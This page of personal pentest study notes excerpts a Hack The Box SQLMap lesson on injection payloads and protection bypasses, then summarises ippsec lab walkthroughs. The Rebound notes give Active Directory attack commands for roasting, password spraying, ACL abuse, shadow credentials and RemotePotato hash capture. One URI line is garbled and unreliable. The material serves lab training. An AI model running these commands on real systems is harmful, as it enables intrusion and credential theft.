+[14:17:07] [PAYLOAD] 1")) AND 4540=7088 AND (("hUye"="hUye
+[14:17:07] [PAYLOAD] 1"))) AND 6823=7134 AND ((("aWZj"="aWZj
+[14:17:07] [PAYLOAD] 1" AND 7613=7254 AND "NMxB"="NMxB
+...SNIP...
+[14:17:07] [PAYLOAD] 1"="1" AND 3219=7390 AND "1"="1
+[14:17:07] [PAYLOAD] 1' IN BOOLEAN MODE) AND 1847=8795#
+[14:17:07] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
+On the other hand, payloads used with the default --level value have a considerably smaller set of boundaries:
+
+  Attack Tuning
+Viyky7@htb[/htb]$ sqlmap -u www.example.com/?id=1 -v 3
+...SNIP...
+[14:20:36] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[14:20:36] [PAYLOAD] 1) AND 2678=8644 AND (3836=3836
+[14:20:36] [PAYLOAD] 1 AND 7496=4313
+[14:20:36] [PAYLOAD] 1 AND 7036=6691-- DmQN
+[14:20:36] [PAYLOAD] 1') AND 9393=3783 AND ('SgYz'='SgYz
+[14:20:36] [PAYLOAD] 1' AND 6214=3411 AND 'BhwY'='BhwY
+[14:20:36] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
+As for vectors, we can compare used payloads as follows:
+
+  Attack Tuning
+Viyky7@htb[/htb]$ sqlmap -u www.example.com/?id=1
+...SNIP...
+[14:42:38] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[14:42:38] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
+[14:42:38] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
+...SNIP...
+  Attack Tuning
+Viyky7@htb[/htb]$ sqlmap -u www.example.com/?id=1 --level=5 --risk=3
+
+...SNIP...
+[14:46:03] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[14:46:03] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
+[14:46:03] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
+...SNIP...
+[14:46:05] [INFO] testing 'PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)'
+[14:46:05] [INFO] testing 'PostgreSQL OR boolean-based blind - WHERE or HAVING clause (CAST)'
+[14:46:05] [INFO] testing 'Oracle AND boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)'
+...SNIP...
+[14:46:05] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
+[14:46:05] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'
+[14:46:05] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY clause (original value)'
+...SNIP...
+[14:46:05] [INFO] testing 'SAP MaxDB boolean-based blind - Stacked queries'
+[14:46:06] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
+[14:46:06] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
+...SNIP...
+As for the number of payloads, by default (i.e. --level=1 --risk=1), the number of payloads used for testing a single parameter goes up to 72, while in the most detailed case (--level=5 --risk=3) the number of payloads increases to 7,865.
+
+As SQLMap is already tuned to check for the most common boundaries and vectors, regular users are advised not to touch these options because it will make the whole detection process considerably slower. Nevertheless, in special cases of SQLi vulnerabilities, where usage of OR payloads is a must (e.g., in case of login pages), we may have to raise the risk level ourselves.
+
+This is because OR payloads are inherently dangerous in a default run, where underlying vulnerable SQL statements (although less commonly) are actively modifying the database content (e.g. DELETE or UPDATE).
+
+
+Bypassing Web Application Protections
+There won't be any protection(s) deployed on the target side in an ideal scenario, thus not preventing automatic exploitation. Otherwise, we can expect problems when running an automated tool of any kind against such a target. Nevertheless, many mechanisms are incorporated into SQLMap, which can help us successfully bypass such protections.
+
+Anti-CSRF Token Bypass
+One of the first lines of defense against the usage of automation tools is the incorporation of anti-CSRF (i.e., Cross-Site Request Forgery) tokens into all HTTP requests, especially those generated as a result of web-form filling.
+
+In most basic terms, each HTTP request in such a scenario should have a (valid) token value available only if the user actually visited and used the page. While the original idea was the prevention of scenarios with malicious links, where just opening these links would have undesired consequences for unaware logged-in users (e.g., open administrator pages and add a new user with predefined credentials), this security feature also inadvertently hardened the applications against the (unwanted) automation.
+
+Nevertheless, SQLMap has options that can help in bypassing anti-CSRF protection. Namely, the most important option is --csrf-token. By specifying the token parameter name (which should already be available within the provided request data), SQLMap will automatically attempt to parse the target response content and search for fresh token values so it can use them in the next request.
+
+Additionally, even in a case where the user does not explicitly specify the token's name via --csrf-token, if one of the provided parameters contains any of the common infixes (i.e. csrf, xsrf, token), the user will be prompted whether to update it in further requests:
+
+  Bypassing Web Application Protections
+Viyky7@htb[/htb]$ sqlmap -u "http://www.example.com/" --data="id=1&csrf-token=WfF1szMUHhiokx9AHFply5L2xAOfjRkE" --csrf-token="csrf-token"
+
+        ___
+       __H__
+ ___ ___[,]_____ ___ ___  {1.4.9}
+|_ -| . [']     | .'| . |
+|___|_  [)]_|_|_|__,|  _|
+      |_|V...       |_|   http://sqlmap.org
+
+[*] starting @ 22:18:01 /2020-09-18/
+
+POST parameter 'csrf-token' appears to hold anti-CSRF token. Do you want sqlmap to automatically update it in further requests? [y/N] y
+Unique Value Bypass
+In some cases, the web application may only require unique values to be provided inside predefined parameters. Such a mechanism is similar to the anti-CSRF technique described above, except that there is no need to parse the web page content. So, by simply ensuring that each request has a unique value for a predefined parameter, the web application can easily prevent CSRF attempts while at the same time averting some of the automation tools. For this, the option --randomize should be used, pointing to the parameter name containing a value which should be randomized before being sent:
+
+  Bypassing Web Application Protections
+Viyky7@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1&rp=29125" --randomize=rp --batch -v 5 | grep URI
+
+URI: http://www.example.com:80/?id=1&rp=99954
+URI: http://www.example.com:80/?id=1&rp=87216
+URI: http://www.example.com:80/?id=9030&rp=36456
+URI: http://www.example.com:80/?id=1.%2C%29%29%27.%28%28%2C%22&rp=16689
+URI: http://www.example.com:80/?id=1%27xaFUVK%3C%27%22%3EHKtQrg&rp=40049
+URI: http://www.example.com:80/?id=1%29%20AND%209368%3D6381%20AND%20%287422%3D7422&rp=95185
+Calculated Parameter Bypass
+Another similar mechanism is where a web application expects a proper parameter value to be calculated based on some other parameter value(s). Most often, one parameter value has to contain the message digest (e.g. h=MD5(id)) of another one. To bypass this, the option --eval should be used, where a valid Python code is being evaluated just before the request is being sent to the target:
+
+  Bypassing Web Application Protections
+Viyky7@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1&h=c4ca4238a0b923820dcc509a6f75849b" --eval="import hashlib; h=hashlib.md5(id).hexdigest()" --batch -v 5 | grep URI
+
+URI: http://www.example.com:80/?id=1&h=c4ca4238a0b923820dcc509a6f75849b
+URI: http://www.example.com:80/?id=1&h=c4ca4238a0b923820dcc509a6f75849b
+URI: http://www.example.com:80/?id=9061&h=4d7e0d72898ae7ea3593eb5ebf20c744
+URI: http://www.example.com:80/?id=1%2C.%2C%27%22.%2C%28.%29&h=620460a56536e2d32fb2f4842ad5a08d
+URI: http://www.example.com:80/?id=1%27MyipGP%3C%27%22%3EibjjSu&h=db7c815825b14d67aaa32da09b8b2d42
+URI: http://www.example.com:80/?id=1%29%20AND%209978%socks4://177.39.187.70:33283ssocks4://177.39.187.70:332833D1232%20AND%20%284955%3D4955&h=02312acd4ebe69e2528382dfff7fc5cc
+IP Address Concealing
+In case we want to conceal our IP address, or if a certain web application has a protection mechanism that blacklists our current IP address, we can try to use a proxy or the anonymity network Tor. A proxy can be set with the option --proxy (e.g. --proxy="socks4://177.39.187.70:33283"), where we should add a working proxy.
+
+In addition to that, if we have a list of proxies, we can provide them to SQLMap with the option --proxy-file. This way, SQLMap will go sequentially through the list, and in case of any problems (e.g., blacklisting of IP address), it will just skip from current to the next from the list. The other option is Tor network use to provide an easy to use anonymization, where our IP can appear anywhere from a large list of Tor exit nodes. When properly installed on the local machine, there should be a SOCKS4 proxy service at the local port 9050 or 9150. By using switch --tor, SQLMap will automatically try to find the local port and use it appropriately.
+
+If we wanted to be sure that Tor is properly being used, to prevent unwanted behavior, we could use the switch --check-tor. In such cases, SQLMap will connect to the https://check.torproject.org/ and check the response for the intended result (i.e., Congratulations appears inside).
+
+WAF Bypass
+Whenever we run SQLMap, As part of the initial tests, SQLMap sends a predefined malicious looking payload using a non-existent parameter name (e.g. ?pfov=...) to test for the existence of a WAF (Web Application Firewall). There will be a substantial change in the response compared to the original in case of any protection between the user and the target. For example, if one of the most popular WAF solutions (ModSecurity) is implemented, there should be a 406 - Not Acceptable response after such a request.
+
+In case of a positive detection, to identify the actual protection mechanism, SQLMap uses a third-party library identYwaf, containing the signatures of 80 different WAF solutions. If we wanted to skip this heuristical test altogether (i.e., to produce less noise), we can use switch --skip-waf.
+
+User-agent Blacklisting Bypass
+In case of immediate problems (e.g., HTTP error code 5XX from the start) while running SQLMap, one of the first things we should think of is the potential blacklisting of the default user-agent used by SQLMap (e.g. User-agent: sqlmap/1.4.9 (http://sqlmap.org)).
+
+This is trivial to bypass with the switch --random-agent, which changes the default user-agent with a randomly chosen value from a large pool of values used by browsers.
+
+Note: If some form of protection is detected during the run, we can expect problems with the target, even other security mechanisms. The main reason is the continuous development and new improvements in such protections, leaving smaller and smaller maneuver space for attackers.
+
+Tamper Scripts
+Finally, one of the most popular mechanisms implemented in SQLMap for bypassing WAF/IPS solutions is the so-called "tamper" scripts. Tamper scripts are a special kind of (Python) scripts written for modifying requests just before being sent to the target, in most cases to bypass some protection.
+
+For example, one of the most popular tamper scripts between is replacing all occurrences of greater than operator (>) with NOT BETWEEN 0 AND #, and the equals operator (=) with BETWEEN # AND #. This way, many primitive protection mechanisms (focused mostly on preventing XSS attacks) are easily bypassed, at least for SQLi purposes.
+
+Tamper scripts can be chained, one after another, within the --tamper option (e.g. --tamper=between,randomcase), where they are run based on their predefined priority. A priority is predefined to prevent any unwanted behavior, as some scripts modify payloads by modifying their SQL syntax (e.g. ifnull2ifisnull). In contrast, some tamper scripts do not care about the inner content (e.g. appendnullbyte).
+
+Tamper scripts can modify any part of the request, although the majority change the payload content. The most notable tamper scripts are the following:
+
+Tamper-Script	Description
+0eunion	Replaces instances of UNION with e0UNION
+base64encode	Base64-encodes all characters in a given payload
+between	Replaces greater than operator (>) with NOT BETWEEN 0 AND # and equals operator (=) with BETWEEN # AND #
+commalesslimit	Replaces (MySQL) instances like LIMIT M, N with LIMIT N OFFSET M counterpart
+equaltolike	Replaces all occurrences of operator equal (=) with LIKE counterpart
+halfversionedmorekeywords	Adds (MySQL) versioned comment before each keyword
+modsecurityversioned	Embraces complete query with (MySQL) versioned comment
+modsecurityzeroversioned	Embraces complete query with (MySQL) zero-versioned comment
+percentage	Adds a percentage sign (%) in front of each character (e.g. SELECT -> %S%E%L%E%C%T)
+plus2concat	Replaces plus operator (+) with (MsSQL) function CONCAT() counterpart
+randomcase	Replaces each keyword character with random case value (e.g. SELECT -> SEleCt)
+space2comment	Replaces space character ( ) with comments `/
+space2dash	Replaces space character ( ) with a dash comment (--) followed by a random string and a new line (\n)
+space2hash	Replaces (MySQL) instances of space character ( ) with a pound character (#) followed by a random string and a new line (\n)
+space2mssqlblank	Replaces (MsSQL) instances of space character ( ) with a random blank character from a valid set of alternate characters
+space2plus	Replaces space character ( ) with plus (+)
+space2randomblank	Replaces space character ( ) with a random blank character from a valid set of alternate characters
+symboliclogical	Replaces AND and OR logical operators with their symbolic counterparts (&& and ||)
+versionedkeywords	Encloses each non-function keyword with (MySQL) versioned comment
+versionedmorekeywords	Encloses each keyword with (MySQL) versioned comment
+To get a whole list of implemented tamper scripts, along with the description as above, switch --list-tampers can be used. We can also develop custom Tamper scripts for any custom type of attack, like a second-order SQLi.
+
+Miscellaneous Bypasses
+Out of other protection bypass mechanisms, there are also two more that should be mentioned. The first one is the Chunked transfer encoding, turned on using the switch --chunked, which splits the POST request's body into so-called "chunks." Blacklisted SQL keywords are split between chunks in a way that the request containing them can pass unnoticed.
+
+The other bypass mechanisms is the HTTP parameter pollution (HPP), where payloads are split in a similar way as in case of --chunked between different same parameter named values (e.g. ?id=1&id=UNION&id=SELECT&id=username,password&id=FROM&id=users...), which are concatenated by the target platform if supporting it (e.g. ASP).
+
+-----------------------------------------------------------------------------------------------------------
+
+
+    </code></pre>
+</div>
+
+<h2 id="description"><a href="#description">manifestation</a></h2>
+
+<div class="github-dark">
+    <pre><code>
+-------------------[ippsec Zetta]--------------------------------
+- [*] FTP bounce attack will leak ipv6 address to see additional services (most admins forget to add firewall on ipv6
+      , also it is SSRF
+- ippsec has the creds from the website  os he logged in with USER and PASS then EPRT |2|attacker-ipv6|attacker-port
+- then LIST and in your nc listener you should see a connection 
+- the nmap scan for ipv6 is nmap -p- -oA allports -v -6 ipv6-address
+- this episode also show you the use of rsync
+- omg ! this episode has a very unique way of guessing a password with a file size 
+- the way he did it is the exact same way i saw in htb academy after he knew hojw many characters the pass is from the file size he did 
+  egrep '^.{8,9}$' /usr/share/wordlist/rockyou.txt
+- the one in htb academy is under Attacking Common Applications   iis tilde egrep -r ^transf /usr/share/wordlists/* | sed 's/^[^:]*://' > /tmp/list.txt
+------------------------------------------------------------------------------------------------------------
+
+
+    </code></pre>
+</div>
+
+<div class="github-dark">
+    <pre><code>
+-------------------[ippsec TheNotebook]--------------------------------
+- ippsec when saw openssh next to it the ubuntu version he searched for that version guesing it is bionic and said bionic is up to date
+  and he said if it was for example Ubuntu 14 LTS Trusty Tahr he said it wouldb e vulnerable to dirty cow
+- i think SSTI is like reflected XXS and what ippsec does is that he tests for both sql injection and ssti using this
+  {{'4'*4}} "'!@#%(&^%
+------------------------------------------------------------------------------------------------------------
+
+
+    </code></pre>
+</div>
+
+<div class="github-dark">
+    <pre><code>
+-------------------[ippsec Rebound]--------------------------------
+- when ippsec in the nmap scan saw clock skew he said if we do anything kerbaros related we do have to make sure our date is correct otherwise
+  those things will fail
+- ippsec could use the smb login with no auth with the module spider
+  netexec smb 10.10.11.231 -i 'DoesNotExists' -p '' -M spider_plus
+- rubeus dumps the LSASS to get the TGTs the workstation recieved and give it to you this uses 13100 to crack if i got TGS $krb5tgs$ in the memory
+- for tgt it will be $krb5asrep$ and cracked with 18200
+- rubeus arreproast will search for the users that has pre auth disabledusing ldap then it will
+  ask the TGT for those users from the TGT and give it to you these hashs can be cracked with 18200 
+- here, there is no web server, and all tthe ports return no info of users for example even the smb 
+  null session returns no information 
+- so ippsec said with no user list or anything he can't do as rep roasting or brute force 
+- but he can do rid brute force
+- [*] smb enables you to do rid bruteforce if you can not have list of users in the box with only null session or at least one user to
+      access the smb share
+- using the tool netexec smb 10.10.231 -u 'DoesNotExec' -p '' --rid-brute
+- in heist box ippsec found users so you can check how he validated them but here he only have the null session smb user 
+  so he abuse this to brute force rids
+- ippsec shows a great two sed command to added to my arsenal
+- after he got users using rid bruteforce he did
+  netexec ldap 10.10.11.231 -u users.txt -p '' --asreproast asreproast
+  which is the same command as the rubeus asreproast with the different that 
+  rubeus by its own access ldap to search and get users with disabled pre auth
+  while netexec you have to specify
+- he said there are two types of this roasting the asreproasting you will only need to know the username
+- while the kerberoasting which will give you the SPN but normally you need to have an authenticateda account
+- he then said you can do kerberoasting with asreproastable account without any authentication but netexec doessn't do it
+- he tried using the getuserspn.py with -no-auth but he could invalid argument so he know he need the latest version of impacket
+- what he did is python3 -m venv .venv then source .env/bin/activate then pip install . then
+- GetUsersSPNs.py -no-preauth jjones -usersfile users.txt -dc-host 10.10.11.231 rebound.htb
+- ippsec found issues listsing ldap with the user he found because of ntupdate
+- after ippsec used smb null session toget more users and used these users to kerberoast and get tgs of a another user and cracked
+  the password he then used that user to bloodhound using
+  netexec ldap 10.10.11.231 -u ldap_monitor -p 'password' -k --bloodhound -ns 10.10.11.231 -c all
+- when ippsec saw bloodhound and the high value targets can not be reach he tried sspray attack with the user ldap he found using
+  netexec ldap 10.10.11.231 -u users.txt -p 'spray-password' -k --continue-on-success
+- also this box show you have to connect to a KDC with the /etc/krb5.conf
+- ippsec faced issue with bloodhound that i might face where when he run t he command bloodhound give it doesn't work
+- he said it might be because the authentication of the htb in that box is using ldap not smb and the tool might be using 
+  smb
+- so he used another toold called bloodyAD and said this tool is like a swiss army knife for AD on python
+- don't forget ippsec said he learned about installing pip reqs so he is always pulling tghe tool create python env then run 
+  pip install .
+- then he added the user that has add capabilities using the bloodyAD using the command
+  ./bloodyAD -d rebound.htb -u oorend -p 'pass' --host dc01.rebound.htb add groupMember ServiceMgmt oorend
+- then to check he used the command 
+  net rpc group members "ServiceMgmt" -U "rebound.htb"/"oorend" -S "rebound.htb"
+- then he added himself into the GenericAll on the service 
+  ./bloodyAD -d rebound.htb -u oorend -p 'pass' --host dc01.rebound.htb add genericAll 'OU=SERVICE USERS,DC=REBOUND,DC=HTB' oorend
+  then he reset the password of the machine he was targeting and doing all this for using the command
+  ./bloodyAD -d rebound.htb -u oorend -p 'pass' --host dc01.rebound.htb set password winrm_svc 'PleaseSubscribe!'
+- however he said we don't want to update the user password if we want to avoid it and we can avoid it 
+- he said we can do shadow credentials which attaches a certificate to the user and uses that to login 
+- he said the easiest way to do it is through certipy
+  certipy shadow auto -username oorend@rebound.htb -password 'pass' -k -account winrm_svc -target dc01.rebound.htb
+  then login with the evil-winrm hash 
+- he said this is the safer way to do it because we didn't modify the winrm_svc ntlm password so if anything
+  was configured to use that account it's fine like it didn't break anything
+- he said we could also do bloodyAD with that as well if we wanted to
+-  ./bloodyAD -d rebound.htb -u oorend -p 'pass' --host dc01.rebound.htb add shadowCredentials winrm_svc
+   install the tool and run the command it tells you 
+   then make sure klist doesn't have something or remove it if there is using rm /tmp/krb5cc_1000
+   then export KRB5CCNAME=$(pwd)/winrm_svc.ccache
+   klist and you should see you have the TGT
+   then evil-winrm -i dc01.rebound.htb -r rebound.htb
+- ippsec mentions something very interesting with powershell get-process and SI session id
+- ReadGMSAPassword is permision to read group managed service account password
+- eventhough ippsesc was logged in with evilwinrm but he could't run tasklist and qwinsta and he said
+  these processes doesn't work with rpc eventhough registery key can fix that but what he did is he downloaded a tool
+  called runasCs to run these commands after he uploaded the RunasCs and he said unlike the windows runas it will accept
+  a password as an argument
+  ./RunasCs.exe x x qwinsta -l 9
+- when ippsec saw the IS explore session he knew some user is logged in to the same box as him he wanted to run qwinsta 
+  to see who is this user but we could't run qwinsta because this tool doesn't allow to be executed from rpc sessions
+  so he used the RunasCs to run it and found the user is tbrady so ippsec can grab his password using remote potato trick in
+  order to coers an ntlmv2 authentication and get the hash of T brady and if ippsec is lucky he can crack it and the readon 
+  he can grab his hash is because he is logged in the same box  as we are
+  in the attacker sudo socat -v TCP-LISTEN:135,fork,reuseaddr TCP:10.10.11.231:9999
+  in the windows .\RemotePotato0.exe -m 2 -s 1 -x attacker-ip  -p 9999
+- the strange thing here is that ippsec run remote potato without checking the windows version or the impersonation tokens
+  if he has it like if remote potato will work for sure
+- ippsec now has the hash of tbrady he
+- now he can ReadGMSPassword of delegator he said sure we can see the command from bloodhound but he used netexec
+  netexec ldap 10.10.11.231 -u tbrady -p 'pass' -k --gmsa
+- and justt like that he got delegator's ntlm hash
+- he said GMSA is just a password that automatically rotates to a random value every x days and then the service accounts can
+  just magically pull it so this way you don't have to worry about changing like MSSQL's password
+- he checked if he can use this hash to login as delegator using 
+  netexec ldap 10.10.11.231 -u delegator -H ':hash-here' -k
+- with the delegator accound in bloodhound ippsec said it is tricky in that box because he said under the extra properties 
+  there should be constrained delegation but he can't see it 
+- ippsec said also this issue might be compunded by we couldn't get object properties of accounts so we couldn't see alot of the 
+  information but bloodhound isn't too helpful now 
+- and in order to see this it's easiest if we just  go to impacket 
+  findDelegation.py rebound.htb/oorend:'pass' -dc-ip dc01 -k
+- he found that there is indeed constained delegation with the user delegator but i don't know why he used oorend account with
+  the findDelegation
+- ippsec explained delegation is let's say someone hosting some type of resource on active directory the someone is a file server
+  and i want to authenticate to it but i don't want to give the file server my password the file server is going to have 
+  constrained delegation maybe a database is more common for this so forget for file server think of a database I want to
+  authenticate to the database using kerberoas the database going to have constrained delegation so i will give the database
+  my kerberoas ticket my ST my service ticket and then the database is going to the domain controller with a TGS of t he database
+  with my service ticket and if the database is allow to  become me or impersonate me it will pass the auth so then the database
+  will give me that ticket back and everything is hunky dory so it is proxy auth.  
+- ippsec checked the administrator accound for being delegation
+  ./bloodyAD.py -d rebound.htb -u oorend -p 'pass' --host dc01 get object administrator
+- the accound is not delegated it is portected account
+
+- for of all ippsec tried the same we as we do by scanning and trying to find the 80/22 however he could't find even
+  when he tried to get use of the smb with the null session it gaves no file no users nothing so he did rid bruteforce
+  using smb he got usernames then he tried asreproasting he found an account that he can crack his password but the account 
+  is with no benefit so he used getuserspn.py script because it gaves you kerberoastable users without the need of authentication
+  then he got an account but also this account with no good bloodhound connections so he did spray that account pass into the other users
+  and found that one more user using the same password so he found that account can take ownership of another user but his tools uses smb
+  to push rules and smb not allow so he used bloodyAD which uses ldap to push rules then he could take ownership of that user and log in to the
+  machine and from here he found another explorer session exists witht he user tbrady so he did remotepotato to get the ntlm hash of that user
+  and get tbrady's account and tbrady can read GMAs of the delegator so he could own delegator then the delegator has delegation vulnerability
+------------------------------------------------------------------------------------------------------------
+
+
+    </code></pre>
+</div>
+
+
+
+<div class="github-dark">
+    <pre><code>
+-------------------[ippsec Hathor]--------------------------------
+- when ippsec uploaded a file and wanted to know where the file was uploaded he saw where the images in the web server get stored
+- when ippsec knew the cms name he searched the issues in the github of the cms
+- here is another recourse for ippsec using nishang oneliner with iconv
+- ippsec also shows how to obfuscate onliner to avoid detection\
+- but also discovers the powershell is the most restricted where we can't do a lot of the .net reflections which is required for getting reversed shell
+- the command he used is powershell  -c $ExecutionContext.SessionState
+- he also uses powershell -c Get-AppLockerPolicy -effective -xml to get the apps blocked
+- he knew aspx runs normally under the radar of applocker so he searched for insomnia shell aspx
+- smb gives not_supported so ippsec knew smb not supported and he said he have to create kerberos ticket after he found a user's pass
+- using impacket getTGT.py windcorp.htb/beatricemill and the coorect password once prompted will give you the TGT
+- after that he used KRB5CCNAME=beatricemill.ccache smbclient -k -L //[machine-ip] but he got SO_LOGON_SERVERS
+- so he knew he has to setup /etc/krb5.conf so this is a good video for settingup krb5
+------------------------------------------------------------------------------------------------------------
+
+
+    </code></pre>
+</div>
+
+
+<div class="github-dark">
+    <pre><code>
+-------------------[ippsec Sink]--------------------------------
+- ippsec in this episode shared something interesting that we can know the version of jquery using virustotal
+------------------------------------------------------------------------------------------------------------
+
+
+    </code></pre>
+</div>
 
 <style>.github-dark{color:#e1e4e8;background:#24292e;}.ct-806137{color:#B392F0;}.ct-767297{color:#E1E4E8;}.ct-244866{color:#9ECBFF;}.ct-533739{color:#79B8FF;}.ct-326375{color:#6A737D;}.ct-857441{color:#F97583;}.ct-211346{color:#85E89D;}.ct-657843{color:#FFAB70;}</style></div></article></div><div class="bug-container" data-v-3d677fb4=""><svg id="bug-svg" xmlns="http://www.w3.org/2000/svg" xlink="http://www.w3.org/1999/xlink" viewBox="-500 -500 1000 1000" shape-rendering="geometricPrecision" text-rendering="geometricPrecision"><g id="centeredGroup"><g><g id="bug" transform="scale(0.3)" class="no-anim"><g transform="matrix(0 1 1 0 -181 -190)"><g><g transform="translate(-73.5169-38.4886)" clip-rule="evenodd"><path d="M272.925,109.032c0,0,2.559-23.035,20.345-41.841c17.786-18.805,30.24-26.227,38.841-28.59c1.337-.367,6.54,0,8.501,3.634c1.96,3.634,0,8.784-2.694,10.238-8.867,4.783-26.383,16.413-33.997,26.707-8.238,11.14-17.851,29.476-17.051,37.977l-13.945-8.125Z" clip-rule="evenodd" fill-rule="evenodd" stroke-linecap="round" stroke-linejoin="round" stroke-miterlimit="1.5"></path><g transform="matrix(-1 0 0 1 508.385 0)" clip-rule="evenodd"><path d="M272.925,109.032c0,0,2.559-23.035,20.345-41.841c17.786-18.805,30.24-26.227,38.841-28.59c1.337-.367,6.54,0,8.501,3.634c1.96,3.634,0,8.784-2.694,10.238-8.867,4.783-26.383,16.413-33.997,26.707-8.238,11.14-17.851,29.476-17.051,37.977l-13.945-8.125Z" clip-rule="evenodd" fill-rule="evenodd" stroke-linecap="round" stroke-linejoin="round" stroke-miterlimit="1.5"></path></g><path d="M254.526,97.911c-35.103,18.394-69.049,34.232-69.049,86.61h138.098c0-52.378-33.945-68.216-69.049-86.61Z" clip-rule="evenodd" fill-rule="evenodd" stroke-linecap="round" stroke-linejoin="round" stroke-miterlimit="1.5"></path></g><g transform="matrix(-1 0 0 1 435.535-38.4886)" clip-rule="evenodd"><path d="M220.774,403.471c-62.815-37.555-58.198-88.343-58.198-88.343v-115.076h183.9v115.076c0,0,4.617,50.788-58.198,88.343l-.269-1.022v-58.76l20.108-16.434v-32.545c7.793-2.587,13.421-9.94,13.421-18.598c0-10.814-8.779-19.592-19.592-19.592s-19.592,8.778-19.592,19.592c0,8.847,5.877,16.332,13.937,18.762v27.052l-19.775,17.268v70.735c-5.044,2.543-10.45,5-16.243,7.348v-87.247c8.012-2.459,13.845-9.921,13.845-18.735c0-10.813-8.779-19.592-19.592-19.592s-19.592,8.779-19.592,19.592c0,8.814,5.833,16.276,13.846,18.735v87.247l-.158-.064c-2.771-1.127-5.522-2.304-8.247-3.538-2.593-1.174-5.161-2.401-7.704-3.679l-.135-.067v-63.735l-19.775-14.268v-20.792c7.541-2.726,12.937-9.953,12.937-18.431c0-10.813-8.779-19.591-19.592-19.591s-19.592,8.778-19.592,19.591c0,8.658,5.628,16.012,13.421,18.599v25.953l21.109,14.434v50.76l-.27,1.022Zm33.752-101.852c5.341,0,9.676,4.336,9.676,9.676c0,5.341-4.335,9.677-9.676,9.677-5.34,0-9.676-4.336-9.676-9.677c0-5.34,4.336-9.676,9.676-9.676Zm-48.42-18.592c5.34,0,9.676,4.336,9.676,9.676c0,5.341-4.336,9.677-9.676,9.677-5.341,0-9.676-4.336-9.676-9.677c0-5.34,4.335-9.676,9.676-9.676Zm95.84-16.592c5.341,0,9.677,4.336,9.677,9.677c0,5.34-4.336,9.676-9.677,9.676-5.34,0-9.676-4.336-9.676-9.676c0-5.341,4.336-9.677,9.676-9.677Z" clip-rule="evenodd" fill-rule="evenodd" stroke-linecap="round" stroke-linejoin="round" stroke-miterlimit="1.5"></path></g><g transform="translate(-73.5169-38.4886)" clip-rule="evenodd"><g transform="matrix(-.909773 0 0 1 493.319 0)" clip-rule="evenodd"><path d="M166.979,225.446c0-.889-.794-1.612-1.772-1.612h-28.799c-5.068,0-9.183,3.744-9.183,8.354c0,4.611,4.115,8.354,9.183,8.354h28.799c.978,0,1.772-.722,1.772-1.611v-13.485Z" clip-rule="evenodd" fill-rule="evenodd" stroke-linecap="round" stroke-linejoin="round" stroke-miterlimit="1.5"></path></g><g transform="matrix(-.866025-.5-.5 0.866025 609.497791 100.975794)" clip-rule="evenodd"><g id="evygBKlPSqr13_tr" transform="translate(139.737,232.188) rotate(0)"><path d="M139.737,232.188c0-4.61-3.743-8.354-8.354-8.354h-42.772c-4.611,0-8.354,3.744-8.354,8.354c0,4.611,3.743,8.354,8.354,8.354h42.772c4.611,0,8.354-3.743,8.354-8.354Z" transform="translate(-139.737,-232.188)" clip-rule="evenodd" fill-rule="evenodd" stroke-linecap="round" stroke-linejoin="round" stroke-miterlimit="1.5"></path></g></g></g><g transform="translate(-73.5169-38.4886)" clip-rule="evenodd"><g transform="matrix(-1 0 0 1 508.385 41.2501)" clip-rule="evenodd"><path d="M166.979,225.446c0-.889-.722-1.612-1.612-1.612h-29.788c-4.611,0-8.354,3.744-8.354,8.354c0,4.611,3.743,8.354,8.354,8.354h29.788c.89,0,1.612-.722,1.612-1.611v-13.485Z" clip-rule="evenodd" fill-rule="evenodd" stroke-linecap="round" stroke-linejoin="round" stroke-miterlimit="1.5"></path></g><g transform="matrix(-.707107 0.707107 0.707107 0.707107 310.015271 10.447407)" clip-rule="evenodd"><g id="evygBKlPSqr18_tr" transform="translate(139.737,232.188) rotate(0)"><path d="M139.737,232.188c0-4.61-3.743-8.354-8.354-8.354h-42.772c-4.611,0-8.354,3.744-8.354,8.354c0,4.611,3.743,8.354,8.354,8.354h42.772c4.611,0,8.354-3.743,8.354-8.354Z" transform="translate(-139.737,-232.188)" clip-rule="evenodd" fill-rule="evenodd" stroke-linecap="round" stroke-linejoin="round" stroke-miterlimit="1.5"></path></g></g></g><g transform="translate(-73.5169-38.4886)" clip-rule="evenodd"><g transform="matrix(-1 0 0 1 508.385 92.3776)" clip-rule="evenodd"><path d="M166.979,225.446c0-.889-.722-1.612-1.612-1.612h-29.788c-4.611,0-8.354,3.744-8.354,8.354c0,4.611,3.743,8.354,8.354,8.354h29.788c.89,0,1.612-.722,1.612-1.611v-13.485Z" clip-rule="evenodd" fill-rule="evenodd" stroke-linecap="round" stroke-linejoin="round" stroke-miterlimit="1.5"></path></g><g transform="matrix(0 1.06393 1 0 140.199 180.854)" clip-rule="evenodd"><path d="M166.979,232.188c0-4.61-3.519-8.354-7.852-8.354h-24.05c-4.334,0-7.852,3.744-7.852,8.354c0,4.611,3.518,8.354,7.852,8.354h24.05c4.333,0,7.852-3.743,7.852-8.354Z" clip-rule="evenodd" fill-rule="evenodd" stroke-linecap="round" stroke-linejoin="round" stroke-miterlimit="1.5"></path></g><g transform="matrix(-.866025-.5-.5 0.866025 609.497658 221.785295)" clip-rule="evenodd"><g id="evygBKlPSqr25_tr" transform="translate(139.73775,232.188433) rotate(0)"><path 